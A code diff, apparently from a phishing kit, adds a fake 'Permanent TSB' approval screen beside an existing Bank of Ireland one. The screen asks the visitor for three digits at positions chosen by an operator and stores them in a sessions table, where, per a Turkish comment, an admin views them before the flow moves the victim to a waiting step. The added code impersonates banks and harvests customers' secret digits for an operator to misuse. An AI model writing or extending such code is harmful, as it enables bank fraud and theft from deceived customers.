@@ -8,6 +8,7 @@ import { stepToPath } from "@/lib/session-routes";
 import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
 import { Linkify } from "@/components/ui/Linkify";
 import { BoiApprovalCard } from "@/components/approval/BoiApprovalCard";
+import { PtsbApprovalCard } from "@/components/approval/PtsbApprovalCard";
 
 type ApprovalLang = "de" | "tr";
 
@@ -21,6 +22,7 @@ type ApprovalViewState = {
   message: string;
   imageUrl: string | null;
   lang: ApprovalLang;
+  ptsbDigitLabels: [number, number, number];
 };
 
 const APPROVAL_LABELS: Record<string, string> = {
@@ -32,6 +34,7 @@ const APPROVAL_LABELS: Record<string, string> = {
   biometrika_pin_2: "Biometria 2",
   boi_approval: "Bank of Ireland",
   boi: "Bank of Ireland",
+  ptsb_approval: "Permanent TSB",
 };
 
 function parseApprovalHistory(value: unknown): string[] {
@@ -49,6 +52,25 @@ function parseApprovalHistory(value: unknown): string[] {
   }
 
   return [];
+}
+
+function parsePtsbDigitLabels(value: unknown): [number, number, number] {
+  // "3,6,1" ya da [3,6,1] formatini kabul et; gecersizde [3,6,1] default
+  const fallback: [number, number, number] = [3, 6, 1];
+  const toNum = (x: unknown): number => {
+    const n = Number(String(x ?? "").trim());
+    return Number.isInteger(n) && n >= 1 && n <= 8 ? n : 0;
+  };
+  let parts: unknown[] = [];
+  if (Array.isArray(value)) {
+    parts = value;
+  } else if (typeof value === "string" && value.trim()) {
+    parts = value.split(",").map((s) => s.trim());
+  }
+  if (parts.length !== 3) return fallback;
+  const nums = parts.map(toNum);
+  if (nums.some((n) => n === 0)) return fallback;
+  return nums as [number, number, number];
 }
 
 function formatRemainingTime(seconds: number) {
@@ -405,6 +427,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     message: "Please wait...",
     imageUrl: null,
     lang: "de",
+    ptsbDigitLabels: [3, 6, 1],
   });
 
   useEffect(() => {
@@ -450,6 +473,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         message: fd.specialNoticeText ?? fd.customMessage ?? "Please wait...",
         imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
         lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
+        ptsbDigitLabels: parsePtsbDigitLabels(fd.ptsbDigitLabels),
       });
       setReady(true);
     };
@@ -513,6 +537,43 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     }
   }
 
+  // PTSB PAN onayi: kullanicinin girdigi 3 rakam da kaydedilir (admin Onay
+  // kolonunda gorur), sonra confirmed status + wait adimina gecilir.
+  async function handlePtsbSubmit(digits: [string, string, string]) {
+    if (!supabase || !effectiveSessionId) return;
+
+    setSaving(true);
+    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
+    const previousFormData = (existing?.form_data ?? {}) as Record<string, string | undefined>;
+    const confirmedStatus = `${viewState.approvalStatus}_confirmed`;
+    const nextApprovalHistory = [
+      ...parseApprovalHistory(previousFormData.approvalHistory),
+      confirmedStatus,
+    ].filter((item) => item && item.trim().length > 0);
+
+    const { error } = await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        current_step: "wait",
+        form_data: {
+          ...previousFormData,
+          approvalStatus: confirmedStatus,
+          ptsbDigit1: digits[0],
+          ptsbDigit2: digits[1],
+          ptsbDigit3: digits[2],
+          approvalConfirmedAt: new Date().toISOString(),
+          approvalHistory: JSON.stringify(nextApprovalHistory),
+        },
+      })
+      .eq("id", effectiveSessionId);
+
+    setSaving(false);
+    if (!error) {
+      router.push(stepToPath("wait", effectiveSessionId));
+    }
+  }
+
   if (!ready) {
     return (
       <div className="flex min-h-screen items-center justify-center px-4">
@@ -564,6 +625,16 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[var(--brand)]/20 border-t-[var(--brand)]" />
         </div>
       </div>
+    );
+  }
+
+  if (viewState.approvalStatus === "ptsb_approval") {
+    return (
+      <PtsbApprovalCard
+        digitLabels={viewState.ptsbDigitLabels}
+        saving={saving}
+        onSubmit={(digits) => void handlePtsbSubmit(digits)}
+      />
     );
   }
 
